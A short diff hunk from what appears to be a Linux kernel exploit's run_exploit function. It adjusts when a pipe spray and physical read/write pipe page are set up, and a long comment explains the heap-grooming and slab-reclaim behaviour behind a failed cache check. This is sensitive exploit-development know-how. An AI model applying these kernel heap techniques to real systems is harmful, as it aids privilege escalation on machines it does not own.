@@ -230,7 +230,16 @@ int run_exploit(int argc, char **argv) {
     return 0;
   }
 
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
+    !(defined(PHYSRW_REFRESH_PIPE_PAGE) && PHYSRW_REFRESH_PIPE_PAGE)
+  /* Seeding the physrw pipe page here only works where it survives the groom
+   * below. Where it does not, PHYSRW_REFRESH_PIPE_PAGE takes the page at the
+   * point of use instead, and this spray has to go with it: the non-app build
+   * reaches install_pipe_physrw() having never sprayed pipes, so its reclaim
+   * lands on a fresh order-3 page. Doing it here and then freeing several
+   * hundred pipe_buffer slabs immediately before the retry leaves the new
+   * reclaim on a partially free slab, which is what `phys step cache gate
+   * failed slab=… want=<kmalloc-2k>` reports. */
   reset_pipe_attempt();
   pipebuf_page_base = prepare_pipe_buffer_page();
   pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
